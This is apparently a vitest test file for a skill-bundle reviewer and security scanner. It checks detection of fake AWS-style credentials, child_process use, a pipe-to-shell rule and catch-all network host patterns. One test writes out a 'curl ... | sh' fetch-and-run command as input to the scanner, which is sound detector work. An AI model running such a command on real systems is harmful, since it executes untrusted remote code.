import { describe, expect, it } from 'vitest';
import {
  createSkillTemplate,
  estimateImpactScore,
  isAllowedHostPattern,
  MAX_FILE_CHARS,
  parsePluginManifest,
  pluginManifestProblem,
  reviewSkillBundle,
  scanSkillSecurity,
} from '../src';

// Credential-shaped strings are assembled at run time, so the repository's
// secret scanner never sees a literal that looks like a real key.
const awsLike = `AKIA${'Q'.repeat(16)}`;

describe('reviewSkillBundle', () => {
  it('scores a valid template above zero and an invalid one at zero', () => {
    const good = reviewSkillBundle(createSkillTemplate('roll-dice', 'Roll dice in chat.'));
    expect(good.score).toBeGreaterThan(0);
    expect(good.checks.some((c) => c.id === 'valid-bundle' && c.passed)).toBe(true);
    const bad = reviewSkillBundle({ 'SKILL.md': '# none' });
    expect(bad).toEqual({ score: 0, checks: [expect.objectContaining({ passed: false })] });
  });

  it('applies a rubric: reweighted, disabled', () => {
    const bundle = createSkillTemplate('roll-dice', 'Roll dice when asked for random numbers.');
    const review = reviewSkillBundle(bundle, undefined, {
      checks: [
        { id: 'headings', weight: 50 },
        { id: 'scripts-dir', weight: 5, enabled: false },
      ],
    });
    expect(review.checks.find((c) => c.id === 'headings')?.weight).toBe(50);
    expect(review.checks.some((c) => c.id === 'scripts-dir')).toBe(false);
  });

  it('estimates impact from review signals', () => {
    const review = reviewSkillBundle(createSkillTemplate('roll-dice', 'Roll dice in chat.'));
    expect(estimateImpactScore(review)).toBeGreaterThan(0);
  });
});

describe('scanSkillSecurity', () => {
  it('passes a clean bundle', () => {
    expect(scanSkillSecurity(createSkillTemplate('safe', 'A safe skill.')).status).toBe('pass');
  });

  it('fails on a credential pattern', () => {
    const result = scanSkillSecurity({ 'SKILL.md': `# Skill\n${awsLike}` });
    expect(result.status).toBe('fail');
    expect(result.issues[0]).toMatchObject({ severity: 'critical', ruleId: 'cred-aws' });
  });

  it('checks script rules only in scripts, and goes advisory on a medium', () => {
    expect(scanSkillSecurity({ 'references/a.md': 'uses child_process' }).status).toBe('pass');
    expect(scanSkillSecurity({ 'scripts/a.js': 'require("child_process")' }).status).toBe(
      'advisory',
    );
  });

  it('bounds the pipe-to-shell rule to 500 characters, as the harness does', () => {
    const near = `curl https://x.test/i ${'a'.repeat(100)}| sh`;
    const far = `curl https://x.test/i ${'a'.repeat(600)}| sh`;
    expect(scanSkillSecurity({ 'scripts/i.sh': near }).status).toBe('fail');
    expect(
      scanSkillSecurity({ 'scripts/i.sh': far }).issues.some(
        (i) => i.ruleId === 'script-pipe-bash',
      ),
    ).toBe(false);
  });

  it('reports an oversized file for its size and does not pattern-match it', () => {
    const result = scanSkillSecurity({
      'references/big.md': `${awsLike}${'x'.repeat(MAX_FILE_CHARS)}`,
    });
    expect(result.issues.map((i) => i.ruleId)).toEqual(['size-large']);
  });

  it('skips base64 asset text', () => {
    expect(scanSkillSecurity({ 'assets/a.png': awsLike }).issues).toEqual([]);
  });

  it('surfaces declared egress as a low, non-blocking issue', () => {
    const result = scanSkillSecurity({
      'SKILL.md': '# ok',
      'plugin.json': JSON.stringify({ name: 'x', network: { allowedHosts: ['api.stripe.com'] } }),
    });
    const issue = result.issues.find((i) => i.ruleId === 'network-egress-declared');
    expect(issue?.severity).toBe('low');
    expect(issue?.message).toContain('api.stripe.com');
    expect(result.status).toBe('pass');
  });
});

describe('plugin.json', () => {
  it('accepts concrete hosts and specific wildcards', () => {
    for (const host of ['api.stripe.com', 'github.com', '*.example.com', 'registry.npmjs.org']) {
      expect(isAllowedHostPattern(host)).toBe(true);
    }
  });

  it('rejects catch-all and TLD-wide patterns', () => {
    for (const host of ['*', '*.*', '**', '*.com', '', '   ', 'localhost', 'not a host']) {
      expect(isAllowedHostPattern(host)).toBe(false);
    }
  });

  it('parses a valid manifest with the default skills list, and refuses a catch-all host', () => {
    expect(parsePluginManifest(JSON.stringify({ name: 'p' }))?.skills).toEqual(['SKILL.md']);
    expect(pluginManifestProblem({ name: 'x', network: { allowedHosts: ['*'] } })).toContain(
      'catch-all',
    );
    expect(parsePluginManifest('not json')).toBeNull();
  });
});
